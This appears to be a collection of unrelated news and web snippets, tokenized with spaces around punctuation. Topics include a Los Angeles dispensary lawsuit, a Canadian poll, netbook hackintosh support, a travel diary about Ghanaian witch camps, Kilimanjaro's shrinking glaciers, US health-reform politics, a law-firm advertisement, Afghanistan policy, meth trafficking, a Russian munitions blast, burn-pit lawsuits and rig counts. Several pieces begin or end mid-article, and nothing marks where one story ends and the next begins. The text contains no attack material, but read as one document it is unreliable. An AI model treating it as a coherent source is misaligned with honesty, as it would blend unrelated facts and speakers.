" You 're going to open the floodgates , " she said .
Robert A. Kahn , an attorney for Green Oasis , argued that the dispensary did nothing wrong , noting that , under state law , the moratorium expired 45 days after it was first enacted .
" The did not believe they were violating the law , " he said .
The L.A. City Council has struggled for more than two years to write a permanent ordinance to replace the temporary ban .
Dan Lutz , a co-owner of Green Oasis and president of the collective association , filed the lawsuit after the council voted to shut down his dispensary , which opened in May .
Lutz , like hundreds of other dispensary owners in Los Angeles , had filed a request with the council for an exemption from the moratorium so he could operate , but opened without permission .
The council failed to act on these requests until June , an oversight that prevented city officials from taking legal steps to close the dispensaries .

The Conservatives and the Liberals are back where they were after last year 's election in terms of support , according to the latest poll from EKOS .
The weekly poll , released exclusively to the CBC , shows the Conservative Party with the support of 37.4 per cent of decided respondents , just a fifth of a percentage point lower than their result in the vote on Oct. 14 , 2008 .
The Liberals , at 26.8 per cent , are just over half a percentage point above where they were under Stéphane Dion 's leadership in the last election .
The poll indicates the NDP was down by about two percentage points from its election result while the Green Party gained more than three points .
Experience , however , suggests the Green Party performs better in polls than at the ballot box , EKOS said .
Conservatives retain double - digit lead
The Conservatives still have a double - digit lead over the Liberals , with the support of 37.4 per cent of decided respondents , down from 38.4 per cent last week .
Liberal support held steady at 26.8 per cent and the New Democratic Party saw support slip to 16.3 per cent from 16.7 per cent last week .
The Green Party had the support of 10 per cent , while the Bloc Québécois had 9.4 per cent support .
The automated telephone survey reached 3,327 people between Oct. 28 and Nov. 3 .
The results carry a margin of error of plus or minus 1.7 percentage points , 19 times out of 20 .
Nobody said running a netbook hackintosh would be easy -- but nobody said they 'd make it this hard .
Apple is currently engaged in a war of compatibility with Palm and , if the developer build of Snow Leopard version 10.6.2 is any indication , the Atom processor is next on the smack down list .
Word on coder street is that the upcoming revision of OS X will kill support for Intel 's little powerhouse .
That could certainly change before it hits the world at large , but we would n't bet on it .
So , if you 're viewing this on an netbook install of your own devising , you may be stuck at version 10.6.1 ( or earlier ) for awhile -- or you may need to do a little custom kernel building .
Either way , we 're thinking that if Apple ever gets around to making a netbook it probably wo n't be an Atom - powered one .
This is the fifth of six posts I ’ll be writing about the witch camps of Northern Ghana .
You can find additional posts below .
Simon picks me up at 5 am .
It is not yet dawn but the moment preceding it , and I can feel the impending energy of the sun pressing violently against the black clouds .
The motorcycle weaves jaggedly across the dirt road and past the prison , the canteen and the hot yellow Western Union that signifies the end of town .
The sun punches through the clouds , flooding the plain with a soft , purplish glow .
Men , women and children pour out of the bush and onto the road , proceeding toward town with baskets of goods on their heads .
Simon and I are going to Yendi , to visit Ghana ’s biggest witch camp , which holds over seven - hundred individuals .
The village was the site of a small war–more aptly described as a chieftaincy crisis–in 2003 .
The violence was the result of a long - lasting dispute between the Abudu and Andani tribes , which vie for power in the area .
The conflict began when a mob stormed the palace of the sitting Ya - Na ( the regional chief ) , beheaded him and then killed another forty townspeople .
In the aftermath , only a few of the perpetrators were brought to justice , and hostile tensions still hover in the area .
The witch camp in Yendi is not actually located in the town , but about forty kilometers outside of it .
Before we begin the trek , we visit with members of Songtaba .
a non-governmental organization ( NGO ) that advocates for those accused of witchcraft .
The organization is coordinated by Enoch Cudjo .
A college graduate with a degree in social work , Cudjo is young and brash .
He wears a bright purple dashiki and , like others , is a bit nervous about talking to the press .
However , after a few minutes of feeling me out , he expounds on his efforts to help those in witch camps .
What Songtaba primarily focuses on is integrating community members and “ accused witches ” together so they can live cohesively .
Cudjo says that one strategy that has been particularly successful was building a well for a village inside of a witch camp , thereby forcing the townspeople to interact with the accused witches when they fetched water .
As I had with Simon , I ask Cudjo whether or not he believes in the existence of witchcraft and / or that the women in the camp are witches .
The question jars him , and he refuses to answer outright .
“ It is not up to me to decide who ’s a witch and who is n’t , ” he says .
“ Instead , I prefer to work on enhancing integration . ”
Simon and I depart and head toward the camp .
As we grow closer , the road becomes increasingly bad and the landscape bleak .
We stop for gas on the side of the road , where three teenagers have a small station where they sell liters of fuel contained in beer bottles .
Two of them have chunks of scarred flesh surrounding their navels from poorly cut umbilical cords .
Finally , we enter the camp .
The architecture is identical to Gambaga and the small , crude huts stretch as far as the eye can see .
Simon finds the chief sitting under a tree .
He is dressed in old dirty clothes and appears nowhere near as regal as the Gambaranna .
I purchase a libation ( a bottle of aperteshie ) for a dollar as a gift , and the chief gives it a blessing before slugging down a glass .
There is only one plastic cup to drink from so we pass it and the bottle around .
Finally , it is my turn .
I grimace and slurp down three ounces of the clear , potent moonshine , trying to minimize my shiver to the delight of the chief and his advisors .
The language spoken is too rare for even Simon to understand well .
However , there is one young boy who speaks English and he is summoned to assist me in interviews .
The chief says something to one of his assistants and two minutes later a half - dozen beaten looking wizards appear .
They are covered in dirt and mud and two of them are wearing ski caps with crescent points at the top ; oddly , they do look a bit like wizards
Previously I have conducted all my interviews one on one , but I decide that because there are six wizards , and I am half - drunk on moonshine , I will host a roundtable .
I direct the wizards to all sit on one bench and they do , patiently awaiting my inquiries like Catholic schoolboys preparing for the confessional .
I ask them why they were accused of sorcery .
Madjuri , who has been at the camp for three years , says that he killed some young boys .
“ Did you really kill them or were you just accused of killing them ? ” I ask .
“ I killed them , ” he said .
“ Well , why did you kill them ? ”
As the question is being translated , every one –the chief , the translator , the wizards and Simon–begins to laugh .
I realize it ’s a ridiculous question , but I do n’t know what else to ask .
“ He does n’t know , ” the translator responds .
“ He says he just did . ”
The wizard on the far end of the bench catches my eye .
He ’s dressed in an oddly fashioned royal blue jacket ; it looks like something that a sea captain might wear .
He has a massive scowling face , and I notice a strange indentation on his head .
He tells me that he was accused of witchcraft by two young boys who said they saw a vision of him in their sleep .
He was beaten by a number of different men , approximately a dozen times .
Then , one day they held him down and pounded a nail into his skull .
The nail is still in his head and he can no longer see out of his left eye .
I take a dozen pictures of him , like he ’s an animal at a zoo , and then give Simon the wave that means I ’m finished .
I toss my Yendi translator a weird psychedelic eagle t- shirt that was sitting in my bag–his shirt has more holes than cloth–and bump fists with the remaining wizards before leaping on the back of the motorcycle .
We have to push it to get back to Tamale before dark , and I bob up and down as the bike plunges through rut after rut .
Back in Tamale , I pay Simon $ 40 for five days of work .
It comes out to $ 2 per hour and it ’s more than he ’s made in the last month .
We sleep in a terrible hotel–everything else is booked because of a convention–and I wake up in the morning to a cockroach sidling up my leg .
I head to the bus station and two hours later I am riding on the big , comfy STC passenger bus back to Accra .
I ’m done with Gambaga .
I sleep the whole way ; I need it badly .
I have n’t slept right in a week .

( CNN ) --
The ice and snow that cap majestic Mount Kilimanjaro in Tanzania are vanishing before our eyes .
If current conditions persist , climate change experts say , Kilimanjaro 's world - renowned glaciers , which have covered Africa 's highest peak for centuries , will be gone within the next two decades .
" In a very real sense , these glaciers are being decapitated from the surface down , " said Lonnie Thompson , professor of earth sciences at Ohio State University .
Thompson is co-author of a study on Kilimanjaro published Monday in the journal Proceedings of the National Academy of Sciences .
The study 's authors blame the disappearing ice on increases in global temperatures and diminished snowfall at Kilimanjaro 's summit .
Previous studies of Kilimanjaro 's glaciers have relied on aerial photographs to measure the rate of the retreating ice .
For this new survey , scientists climbed the mountain and drilled deep into the glaciers to measure the volume of the ice fields atop the 19,331 - foot ( 5,892 - meter ) peak .
The ice sheet that capped Kilimanjaro in 2007 was 85 percent smaller than the one that covered its plateau in 1912 , paleoclimatologists explained in the study .
The mountain 's ice cover shrank about 1 percent a year from 1912 to 1953 , a rate that has accelerated in recent years .
From 1989 to 2007 , that rate jumped to 2.5 percent a year .
Since 2000 , the plateau 's three remaining ice fields have shrunk by 26 percent , scientists found .
Thompson and his team of researchers have spent seven years measuring the glaciers of Kilimanjaro , whose snow - capped profile rises dramatically over the surrounding tropical plains .
Using 110 " porters , " or local residents , they carried 6 tons of equipment to the mountain 's plateau .
Battling temperatures as low as 35 degrees below zero , and with very little oxygen , Thompson and his crew lived atop Kilimanjaro for nearly two months , drilling and collecting core ice samples buried thousands of feet below the glaciers ' surface .
The new data shows that both the Northern and Southern ice fields atop Kilimanjaro have thinned dramatically in recent years , while the smaller Furtwangler Glacier shrank as much as 50 percent between 2000 and 2009 .
As the glaciers break up into smaller pieces , more of the darker surface of the crater is exposed .
This causes temperatures to rise on the mountain and accelerates the melting of the ice , scientists say .
" The shrinkage and ultimate disappearance of these glaciers will create tremendous ecological and social problems in the near future , " said Doug Hardy , senior research fellow in the Climate Systems Research Center at the University of Massachusetts , Amherst .
Hardy contributed research to the new study .
" The Kilimanjaro glaciers are indicators for a larger - scale process , " Thompson said .
" It 's not just Kilimanjaro , it 's every tropical glacier in Africa , in the tropical Andes of South America , it 's the glaciers in New Guinea .
We are losing all those glaciers in today 's world . "
A snowless Mount Kilimanjaro also could have economic effects .
Kilimanjaro is a tourist attraction and a crucial revenue generator for Tanzania , one of the world 's poorest counties .
A study published by the Overseas Development Institute in January estimated that 35,000 to 40,000 people visit Kilimanjaro every year , spending almost $ 50 million annually in the country .
The first group includes officials like Peter R. Orszag , the budget director , and Dr. Ezekiel J. Emanuel , the medical ethicist whose brother Rahm is the chief of staff .
The second includes Rahm Emanuel and Nancy - Ann DeParle , the director of the Office of Health Reform , who must contend with the realities of getting legislation passed .
“ Let ’s be honest , ” Rahm Emanuel said in a recent interview .
“ The goal is n’t to see whether I can pass this through the executive board of the Brookings Institution .
I ’m passing it through the United States Congress with people who represent constituents . ”
He went on : “ I ’m sure there are a lot of people sitting in the shade at the Aspen Institute  my brother being one of them  who will tell you what the ideal plan is .
Great , fascinating .
You have the art of the possible measured against the ideal . ”
Mr. Orszag would not be interviewed .
But in an e-mail message sent through a spokesman , he said the current legislation “ lays the foundation ” for cost - cutting over the long - term , adding : “ Will more need to be done in the future ?
Absolutely . ”
Senator Susan Collins , the Maine Republican whose vote the administration is courting , convened a news conference on Monday with Senator Lamar Alexander of Tennessee , a member of the Republican leadership , to spotlight her concerns over cost containment .
Ms. Collins said she had been meeting with a group of moderate Democrats who shared her views .
“ I do n’t believe we need more pilot projects to show us that health care delivery reforms are necessary , ” she said in an interview .
She added , “ I think people are much more upset over the cost of care than the administration is acknowledging . ”
Both the House and the Senate are proposing cost - saving measures .
The House bill projects $ 440 billion in Medicare savings over 10 years ; the Senate Finance Committee bill projects about $ 420 billion .
White House officials say there will be additional , substantial savings in the private sector , as well .
But how much is not clear .

Knowing the judges , opposing counsel , and operations of the courts in Southern Jersey is paramount to winning your case .
In moments of crisis it is extremely difficult to appreciate the various ways New Jersey family law will affect your future .
At Graziano & Flynn , P.C. , in Cherry Hill , N.J. , we offer comprehensive legal representation to individuals struggling with divorce and other family law matters .
As a local N.J. family law firm , our attorneys are eager to commit their time and energy to work tirelessly for your unique situation .
Each case is different and our ability to tailor our representation to meet your needs is one of our specialties .
Different than most other legal issues , family law matters are intensely personal .
The sensitivities surrounding family disputes require thorough dedication , and professional support to facilitate calm and rational decision - making .
The family law attorneys at Graziano & Flynn , P.C. , have years of experience in handling high stakes , emotional divorces .
We cover a wide range of family law matters in Camden County , Burlington County , Gloucester County and throughout the state of New Jersey .
Here is a brief list of some of the various cases a New Jersey family lawyer handles for their clients :
The emotional and complex decision to pursue a divorce in South New Jersey is for many a zero sum game .
Contemplating the benefits in filing for a divorce is no light task .
Divorce is a fracture between two people , and the fracture can penetrate all the way to the extended family and the children of the separating couple .
This can be extremely emotional and depending on the length of the marriage , assets , and other material property , the divorce can crush the spirit of both parties .
When a divorce in Southern New Jersey has property , and other assets in dispute , the principals involved can either choose to subdivide , or fight to gain control of their belongings .
If the parties are able to reach an agreement and divide the property and assets with mutual benefit , than the two individuals will emerge victorious .
The legal fees associated to dividing belongings more often than not will cost more than the sum value of the property in dispute .
Most family disputes in Southern New Jersey that conclude in agreement are resolved faster than a divorce and are far less costly .
Alimony , or spousal support is the obligation bound by law where one spouse is required by New Jersey family law to extend financial aid to the other party preceding separation or divorce .
Some of the factors in determining alimony payments in New Jersey include some of the following :
An ability to pay
The lifestyle supported in marriage
Their ability to earn , and how much they actually earn
The duration of the marriage
Alimony is usually granted after a lengthy marriage , or in certain instances some individuals agree to give up career ambitions to support their spouse or children .
Alimony is a form of financial aid awarded in a divorce or in a legal separation and in many circumstances , alimony in Southern New Jersey is decreed in parallel with child support , which will come at the discernment of the New Jersey judge in the case .
Going through divorce as a business owner in Southern New Jersey is a process that will require competent legal counsel .
As a business owner , you are recommended to understand what action the court may take against you .
A court handling family law in Southern New Jersey has to first assign value upon the assets and debts in the marriage .
Appraising a business is sometimes easy and can be concluded simply by reviewing a balance sheet , or it can be rather difficult .
Assessing the value of a business owner can also entail teams of accountants testifying in court over the worth of the business .
I am here to help you establish a separation agreement .
For those who have come to a point where you can no longer continue with your spouse , yet you are not yet ready for a full divorce , the separation agreement is your best choice .
Taking the step to separate from your partner is never easy , especially when there are children , assets and other properties at risk .
Without completely terminating the marriage , a separation agreement enables you to maintain your legal rights within the following parameters of New Jersey family law : child and spousal support arrangements ; assets and living arrangements , child custody , visitation rights , and more .
Once your divorce is complete you may require further adjustments , or modifications to one or more stipulations in your divorce settlement .
In some cases , one of the parties involved in the divorce wants to change the visiting permissions after the divorce decree has been issued , or in other cases a mistake may have been made by one of the principals involved and this will certainly require a modification .
In certain instances when the other party is unable to hold their end in the original divorce agreement , enforcement action will need to be initiated .
If the other party has abandoned a court order , or divorce agreement , the court can bestow actions on clauses of the agreements using contempt of court , and other methods .
The law office of Graziano & Flynn can help you petition the Southern New Jersey court for help if your ex-wife / husband has neglected to hold up their side of the terms in your divorce .
For couples with children who are in the process of divorce , one of the most pressing and troubling parts to the divorce is how to address the issue of custody for the children .
At Graziano & Flynn we have decades of experience in fighting for your desires in the battle of child custody .
Our practice has helped countless families in Cherry Hill , New Jersey , as well as other communities in Camden County , N.J. and other communities , deal with the emotional range of issues that are raised when children are involved in a divorce .

If you were planning to see Kanye West , above left , and Lady Gaga , above right , together , better hope you saved that recording of the MTV Video Music Awards on your TiVo .
A national concert tour featuring Mr. West and Lady Gaga has been canceled , The Associated Press reported .
The concert promoter Live Nation was to produce the tour , which was to be called “ Fame Kills ” and run from November through January , but on Thursday announced that all dates had been dropped .
Lady Gaga told Billboard magazine that the ending of the tour had been a “ mutual decision ” made by her and Mr. West .
Live Nation said that ticket holders would receive refunds .
The left - wing filmmaker behind a documentary that questions U.S. policy in Afghanistan says he “ took a lot of grief ” and lost progressive donors when he began making the movie “ Rethink Afghanistan . ”
Robert Greenwald ’s latest effort criticizes the U.S. ’s current approach to the war in Afghanistan , even if it tarnishes the image of Pres. Barack Obama by association .
Greenwald says his intent with the film is to get people talking about the Afghan war and questioning U.S. policy there , which made some progressives angry in the early days of the Obama administration .

“ When we started doing it , we took a lot of grief , we lost funders , people were mad at us , ” Greenwald said in a phone interview with Raw Story .
“ It was at a time when there was this notion that anything the Obama administration did you were not supposed to question . ”
Greenwald has a petition on the movie ’s website that calls on Congress to debate “ civilian alternatives to a failed military - based approach to bringing peace and security to the region . ”
He told Raw Story he was prompted to make the movie after a recent trip through Vietnam when he noticed parallels between the Afghan war and the Vietnam war .
“ I started thinking , literally , you could cross out Kennedy and replace it with Obama , and cross out communism and replace it with a fear of terrorism , ” Greenwald told Raw Story .
After the movie ’s D.C. premiere on Tuesday night , a freshman Democratic congresswoman quoted a “ colleague ” of hers as saying Obama may need to be saved “ from himself ” in deciding Afghan war policy .
Suburban Maryland U.S. Rep. Donna
Edwards made the comments while discussing the “ tough choice ” ahead for members of Congress in which they will have to decide whether to approve funding more troops for the war in Afghanistan if Obama follows the recommendation of his top military commander there and asks for additional resources .
General Stanley McChrystal , the top U.S. and NATO commander for the war in Afghanistan who was hand - picked by Obama , has told the president he wants to expand the U.S. presence in Afghanistan .

“ As one of my colleagues –who shall remain nameless–said , ‘ Indeed , we may have to save this president from himself on Afghanistan , ” ” Edwards told the crowd , after encouraging attendees to take action in their communities by “ raising questions ” about the war .
“ We have to be vocal and insistent on this administration and this Congress not to fall prey to the language of the good war , ” Edwards said , referencing how the Afghan efforts were once viewed favorably by the American public in comparison to the Iraq war .
Edwards told reporters later that her comments stemmed from concerns that Obama was being pressured to escalate the Afghan war .
ADVERTISEMENT
“ It ’s clear just from reading the headlines he is getting some advice and a push to escalate , ” Edwards said .
General McChrystal has said the fate of the Afghan war will likely be decided in the next 12 months , and is expected to request as many as an additional 40,000 troops for the conflict in the near future .
The U.S. currently has roughly 100,000 troops in Afghanistan .
Obama told a group of bipartisan lawmakers Tuesday that he has no plans to lower troop levels in Afghanistan , the Washington Post reported .
Edwards said she does n’t support adding troops to Afghanistan , and hopes to give Obama room “ to step back , make a full assessment , ” on the future of the war .
Fulfilling the Promises of Cairo
On June 4 , U.S. President Barack Obama traveled to Cairo ’s distinguished Cairo University to deliver an historic address to the Muslim world .
According to a Pew Research Center public opinion poll released this summer , the euphoria that initially accompanied his speech has mostly dissipated in the region .
There is a clear improvement in public opinion of the United States in certain influential Muslim countries , including Obama ’s former home , Indonesia , and confidence in the president himself is high .
However , Obama ’s personal popularity has not translated into major improvement across the board in attitudes toward the United States .
Given that it may take much longer for the administration to offer up major foreign breakthroughs that will mitigate Muslim resentment against America , the White House should consider a policy of diplomatic , economic and social engagement to protect the president ’s down payment with the Muslim world .
The U.S. government must undertake major reforms to fulfill Obama ’s outreach to the 54 states comprising the Organization of the Islamic Conference ( OIC ) .
It would require a massive retooling of the U.S. government and a major reallocation of foreign assistance .
On the diplomatic front , the United States should appoint a full - time observer to the OIC and the 22 - member Arab League .
In a noticeable failure for U.S. diplomacy throughout the Muslim world , there has never been a sustained U.S. diplomatic engagement with these two major organizations .
With full - time observers , U.S diplomats would accelerate dialogue and plan new engagement opportunities with Muslim states , coordinate trade and development initiatives , and more effectively communicate Muslim views back to Washington from the secretariats of each organization .
Moreover , Muslim states consider the OIC and the Arab League important organizations that reflect Muslim viewpoints on crucial matters of interest to Washington , such as Middle East peace , interfaith dialogue , and intra-Muslim state relations .
Moreover , through greater involvement with the OIC , the United States could better utilize the OIC ’s Jerusalem Committee to consider the future status of Muslim holy places in Jerusalem in tandem with a re-energized Israeli - Palestinian negotiation track .
The White House should consider approaching the OIC to convene a joint U.S. - OIC White House summit to explore ways to expand interfaith dialogue and means to empower Islamic moderates .
The president clearly intends to leverage his Cairo speech to expand U.S. trade and development ties to enable the Muslim world to compete more effectively in a globalizing world .
This will require education programs , training , reform , and foreign investment .
One important step would be the creation of a joint U.S. - OIC Task Force to develop a Muslim - American Entrepreneurial Development Private - Public Partnership Fund .
The goal of this fund would be to help train a new generation of Muslim youth in vocational and entrepreneurial skills .
So many Muslim universities educate young Muslims in the " conservative arts " and not in business and vocational skills .
The fund ’s goals would be to initially develop entrepreneurial and vocational educational material in the languages of each Muslim nation and provide U.S. and local entrepreneurial advisors to identify new sources of business funding and vocational training opportunities .
Improving the economic climate in poorer Muslim countries will also require trade reforms to attract more foreign investment and development .
Toward that objective , the U.S. Trade Representative ’s office should establish a Muslim world task force to expedite negotiation of U.S. trade and investment framework agreements ( TIFAs ) with those Muslim nations that so far have not done so ( 32 OIC members ) .
TIFAs set the stage for bilateral strategic dialogue on trade and investment expansion and have been used to resolve impediments to foreign investment and facilitate the negotiation of bilateral and regional free trade agreements with Muslim countries such as Morocco , Jordan , and Bahrain .
These agreements have catalyzed increases in foreign investment , job creation , and market reforms .
In addition to trade and investment reforms , there are other developmental initiatives that the Obama administration may consider , including the establishment of a joint U.S. - Muslim World Health Program to focus on providing disease eradication support .
Child malnutrition , childhood diseases , diabetes , and tobacco consumption , just to name a few , constitute major health challenges in many Muslim nations .
Expanding U.S. medical training to Muslim doctors and introducing new online clinical training to local Muslim healthcare workers could advance healthcare in the Muslim world .
When I was ambassador to Morocco , NATO shipped excess medical supplies to Morocco — an important source of pediatric medical equipment for the country .
The Obama administration should also direct the Commerce Department to organize reciprocal trade missions from Muslim nations .
These missions would bring Muslim business executives to the United States to meet with U.S. counterparts , helping to break down barriers , facilitate trade , and open prospective Muslim entrepreneurs to new business ideas .
The Commerce Department should also establish a roving U.S. - Muslim Job Fair that will visit each Muslim nation to introduce Muslim youth to vocational and entrepreneurial education opportunities .
Finally , the Obama administration should consider creating a U.S. - Muslim Business Volunteer Corps composed of retired U.S. business executives to help train Muslim youth in business skills .
Several decades ago , USAID enlisted retired U.S. business executives for such goals , and the program could be dusted off .
Effective U.S. public diplomacy programs in many Muslim countries are nonexistent or underfunded .
New and imaginative private - public partnerships are needed to enable the State Department to support the president ’s goal of better engaging Muslim mass audiences by enlisting the support of the U.S. media industry more effectively and more consistently .
One such idea developed by Layalina Productions — a Muslim world media technology and production company of which I am president — would use Google Earth as a completely censor - proof Web portal that would enable Muslim and American youth to use blogs , Facebook , Twitter and other forms of social media to communicate .
Designated MERKHET ( an ancient Egyptian word for sextant ) , this technology would enable Iran ’s youth to communicate without Iranian government interference with Americans .
There are now over 450 private or semi-private media outlets in the Muslim world without adequate cross-cultural television programming to open Muslim minds .
Expanding U.S. government support for private - sector media programming production for Muslim media outlets is vital if there is going to be any effective means for the White House to maintain an open line of communication with the Muslim world .
A Council on Foreign Relations 2002 Task Force on Public Diplomacy recommended the creation of a new Corporation for Public Diplomacy to enlist the support of the U.S. media industry to begin supplying Muslim networks with new and innovative programs .
So far , the State Department has done very little to retool itself to the challenge .
Additionally , Muslim journalists have inadequate access to their fellow U.S. journalists .
Establishing a journalism exchange center in Abu Dhabi , linking American and Muslim journalists and bloggers , could facilitate better cross communication .
In the final analysis , what ails the Muslim world cannot be cured simply by Obama ’s words or deeds .
It ’s stagnant Muslim regimes and radical Muslim clerics who are failing their own people , not the U.S. president .
But Obama ’s election and personal popularity have opened a small window of opportunity for the United States to divert Muslim hostility toward the real sources of their own ills .
Hopefully , the administration will seize every opportunity to avail itself of that opening by beginning to realize some of the sky - high expectations Obama ’s speech produced throughout the Muslim world .

The goal was to curb production of methamphetamine by cutting off key ingredients .
It worked : Domestic production of methamphetamine fell .
But a blow to meth labs in the United States became , in turn , a boon to a group in Mexico .
La Familia started manufacturing meth a few years earlier in the western state of Michoacán .
By 2006 , the group had emerged as a major distributor .
No one claims that the emergence of La Familia was the direct result of the US law .
But US production of meth has decreased dramatically since 2004 , according to the National Drug Intelligence Center 's National Methamphetamine Threat Asses­sment of 2008 .
A global report from the United Nations Office on Drugs and Crime from 2008 also shows a 92 percent decline in the number of large - capacity labs in the US from 2001 to 2007 .
But in the same period , methamphetamine seized along the Mexican border dramatically increased .
( There was a significant dip again in 2007 , but seizure numbers are still higher than they were in 2001 . )
Experts say that the expansion of meth networks operated by Mexican organizations is a major factor in the sustained meth supplies in the US today , even with new import restrictions on chemicals in Mexico .
Some are not surprised .
" The entire history of US interdiction policies toward Latin America in the 20th century has created that pattern .
The inadvertent [ results ] of crackdowns or interdiction policies in the Andes , and in the Caribbean , have always had enormously adverse effects , " says Paul Gootenberg , a history professor at the State University of New York , Stony Brook , and the author of " Andean Cocaine : The Making of a Global Drug . "
Even meth 's surging popularity was in part created by the crackdown on cocaine .
In other words , he says , this is an old story about unintended consequences .

At least two people have been killed after a series of explosions and fires at a weapons depot in central Russia , officials say .
The blasts ripped through the defence ministry navy depot on the outskirts of Ulyanovsk when soldiers attempted to decommission munitions .
The officials later said that 43 people who were feared dead had been found safe in a bomb shelter near the site .
Some 3,000 people were evacuated from the surrounding area .
The depot is about 900 km ( 550 miles ) south - east of the capital Moscow .
' Like fireworks '
Two fire - fighters died at the Arsenal 31 depot after the blasts and fires , Ulyanovsk Governor Sergei Morozov told the BBC .
Mr Morozov was earlier quoted in Russian media as saying that at least 10 people were taken to hospital .
The governor also told Russia 's First Channel TV : " More than 40 people have been saved , including those who were reported missing . "
He was referring to the 43 people who had been found safe and well in the bomb shelter .
Explosions at the depot continued into the night , with TV footage of the area showing intermittent blasts sending thick plumes of smoke high into the air .
The blasts shattered windows of nearby homes .
The first explosion happened about 1600 local time ( 1300 GMT ) while ammunition was being disposed of at the site .
The blast set off a series of explosions and also started fires .
" There was a loud bang , then there was silence and then there were explosions , explosions , explosions , like fireworks on New Year , " local resident Igor Komandin told First Channel .
Fire - fighters at the scene were battling the blazes several hours after it started .
A large exclusion zone has been set up around the depot .
The Federal Security Service advised Ulyanovsk residents to buy gauze masks and stock up on drinking water , but added that the situation was under control .
Officials said artillery shells and torpedoes were kept at the arsenal , adding that a nearby chemicals weapons depot was not in any danger .
A criminal investigation into the accident is now under way .
Ulyanovsk sits beside the Volga river and is the birthplace of Bolshevik leader Vladimir Lenin .
Contractors working for the military in Iraq and Afghanistan are fouling the nests of U.S. soldiers with pollution , poisoning the troops in the very bases meant to be their sanctuaries .
That 's the central allegation in a new set of lawsuits filed in Nashville and elsewhere across the country .
The legal actions name as defendants the controversial contracting firm KBR Inc. ( formerly Kellogg Brown and Root ) , as well as Halliburton Co. , of which KBR used to be a subsidiary , and a Turkish general contracting firm , ERKA Ltd .
" These for - profit corporations callously exposed and continue to expose soldiers and others to toxic smoke , ash and fumes , " says the complaint filed in Nashville on Friday , which asks for damages on behalf of two Tennessee soldiers .
" These exposures are causing a host of serious diseases , increased risk of serious diseases in the future , death and increased risk of death . "
The lawsuit , which seeks class - action status , describes " burn pits " at U.S. bases in both military theaters that contain " every type of waste imaginable . "
Reading like a postmodern version of Jonathan Swift 's Description of a City Shower , the catalog of rubbish in the pits includes :
" Tires , lithium batteries , Styrofoam , paper , wood , rubber , petroleum - oil - lubricating products , metals , hydraulic fluids , munitions boxes , medical waste , biohazard materials ( including human corpses ) , medical supplies ( including those used during smallpox inoculations ) , paints , solvents , asbestos insulation , items containing pesticides , polyvinyl chloride pipes , animal carcasses , dangerous chemicals , and hundreds of thousands of plastic water bottles . "
" Flames shoot hundreds of feet into the sky " as the huge pits are set ablaze , the Nashville lawsuit claims .
Noting that " burning plastics emit dioxins , which are known to cause cancer , " the complaint accuses the defendants of negligence , battery and inflicting emotional distress .
Saying an estimated 100,000 soldiers and contract personnel may have been harmed by the smoke from the pits , the plaintiffs want the court to force KBR and the other companies to cover future medical expenses and pay other compensatory damages .
It also seeks punitive damages " in an amount sufficient to strip defendants of all of the revenue and profits earned from their pattern of constant , wanton and outrageous misconduct and callous disregard and utter indifference to the welfare of Americans serving and working in Iraq and Afghanistan . "
Attorneys from the Washington D.C. law firm Burke O'Neil LLC brought the Nashville case , with Klint W. Alexander of Wyatt Tarrant & Combs LLP as local counsel .
They are suing on behalf of Anthony Ray Johnson and David Michael Rohmfeld , both of whom are identified as Tennessee residents .
Johnson currently has a mailing address at Ft. Gordon , Ga. , headquarters of the Army 's Signal Corps , but his past and present military unit affiliations are not given .
No such information is available on Rohmfeld , either , but his address is in Clarksville , and he recently identified himself in an online posting as a system analyst and instructor at Westar Aerospace & Defense Group .
Johnson was stationed at Ft. Caldwell and Camp Bucca in Iraq on two deployments between 2004 and 2008 .
The complaint says he has asthma , trouble breathing , migraines and a chronic cough .
Rohmfeld 's
Army service took him to military bases at Kandahar and Bagram , Afghanistan in 2003 .
There he was " constantly exposed to the hazardous toxins emitted from the burn pits designed and operated by " KBR and the other defendants , the lawsuit alleges .
" As a direct result of his exposure , " the complaint continues , " Rohmfeld was diagnosed with asthma and uses two steroid inhalers , as well as a rescue inhaler . "
KBR , Halliburton respond
At least 22 lawsuits over " burn pits " at US bases have been filed nationwide in the past year .
A panel of judges last month consolidated the cases for litigation in Maryland 's district court , and its order appears to indicate that newly filed lawsuits will become part of the Maryland case as well .
The Burke O'Neil firm is involved with several of those lawsuits , and it filed a complaint in Nevada on Friday that is essentially identical to the Nashville case .
Further such cases are expected to be filed this week .
Halliburton spokesperson Diana Gabriel over the weekend reiterated prior assertions that her company is “ improperly named ” in such legal actions and said she expects Halliburton to be dismissed from them .
Halliburton and KBR , both now publicly traded companies , separated their operations earlier in this decade after KBR had been a Halliburton subsidiary since the 1960s .
Heather Browne , director of corporate communications for KBR , issued a statement asserting that " there are significant discrepancies between the plaintiffs ’ claims in the burn litigation against KBR and the facts on this issue . "
Among the points Browne made :
" KBR provides burn pit services at some , but not all , bases in Iraq and Afghanistan .
At the sites where KBR provides burn pit services , the company does so ... in accordance with the relevant provisions " of its contracts as well as " operational guidelines approved by the Army . " " KBR does not decide where to locate or operate a burn pit .
That decision is made by the Army .
KBR operates burn pits in accordance with guidelines approved by the Army .
Further , it is the Army that also decides where on base to locate the living and working facilities for base personnel . "
" It is not KBR ’s decision to use burn pits or to install incinerators " instead of burn pits .
" When the Army makes the decision that an incinerator will be used in lieu of other methods of waste disposal , it funds the purchase of the incinerator and directs KBR or other contractors to provide operational and maintenance services .
KBR and other tenants on bases have no ability to use an incinerator until directed by the Army . "
" The Army creates a prohibited items list that determined which wastes could not be placed in a burn pit .
At bases where KBR provides burn pit services , KBR posts these lists to provide notice to waste generators .
If KBR observes a waste generator delivering a prohibited item , its practice is to refuse or remove such items . "
" At some of the bases in Iraq and Afghanistan , where the Army decided to use burn pits but elected not to have military personnel operate them , KBR and other contractors are doing exactly what the Army would be doing " if it were running the pits . " KBR does not place human body parts in burn pits . "
Land Rig Count On The Rise
After bottoming in early June at 823 rigs , the Lower 48 land rig count has been creeping steadily higher , adding an average of 10 rigs per week , and now stands about 29 % ( 241 rigs ) above the nadir .
While the recovery certainly gives drilling contractors something to be thankful for this season , the industry still has a good amount of idle capacity to deal with considering that the land rig count peaked at 1,938 rigs about 15 months ago .
Although quite a few of the rigs stacked during the downturn may never return to the field , simply taking the peak rig count as a proxy for available supply implies that industry wide utilization remains below 60 % .
The Return of Oil Rigs Is Behind The Land Rig Count Gains
With crude oil prices rallying 80 % year - to - date while natural gas prices are still down for the year , operators have focused their drilling efforts on oil rich plays .
A closer look at the land drilling recovery bears out this observation , as just over 80 % of the rig count gains since the June bottom have been oil driven .
